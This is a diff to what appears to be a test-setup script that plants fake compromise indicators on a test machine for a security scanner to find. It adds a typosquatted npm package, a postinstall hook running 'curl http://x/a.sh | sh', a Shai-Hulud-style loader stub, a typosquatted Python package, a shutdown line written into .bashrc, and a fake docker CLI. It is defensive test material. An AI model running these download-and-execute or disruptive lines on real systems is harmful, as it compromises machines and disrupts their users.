@@ -57,4 +57,23 @@ cat > /root/.mcp.json <<'JSON'
 JSON
 chmod 600 /root/.mcp.json
 
-echo "planted: fake ollama (pid $!), /home/test/.env, /etc/cron.d/evil, ld.so.preload=$LIBC, sshd password auth, 60 failed logins, /tmp/.x/kswapd0, LD_PRELOAD in /etc/environment, /root/.mcp.json"
+# 10. Node project with a typosquat, a download-and-execute postinstall hook and a
+#     Shai-Hulud 2.0 loader file, and no lockfile (package_provenance).
+mkdir -p /home/test/app/node_modules/lodahs /home/test/app/node_modules/evil
+echo '{"name": "app", "version": "1.0.0", "dependencies": {"lodahs": "^1.0.0", "evil": "^0.1.0"}}' > /home/test/app/package.json
+echo '{"name": "lodahs", "version": "1.0.0"}' > /home/test/app/node_modules/lodahs/package.json
+echo '{"name": "evil", "version": "0.1.0", "scripts": {"postinstall": "curl http://x/a.sh | sh"}}' > /home/test/app/node_modules/evil/package.json
+echo 'module.exports = 1' > /home/test/app/node_modules/evil/setup_bun.js
+
+# 11. Python venv with a typosquatted dist-info next to the real one.
+mkdir -p /home/test/.venv/lib/python3.15/site-packages/reqeusts-1.0.dist-info \
+         /home/test/.venv/lib/python3.15/site-packages/requests-2.32.0.dist-info
+
+# 12. Shai-Hulud style wiper line appended to a shell rc file.
+printf 'export PATH=$PATH:/usr/local/bin\nsudo shutdown -h now\n' > /home/test/.bashrc
+
+# 13. Fake `docker` CLI so the containers module sees a privileged container with
+#     the Docker socket mounted and an OpenAI key in its environment.
+install -m 755 "$HERE/fake_docker.sh" /usr/local/bin/docker
+
+echo "planted: fake ollama (pid $!), /home/test/.env, /etc/cron.d/evil, ld.so.preload=$LIBC, sshd password auth, 60 failed logins, /tmp/.x/kswapd0, LD_PRELOAD in /etc/environment, /root/.mcp.json, /home/test/app node_modules (lodahs, evil), /home/test/.venv reqeusts, wiper line in /home/test/.bashrc, fake docker CLI"
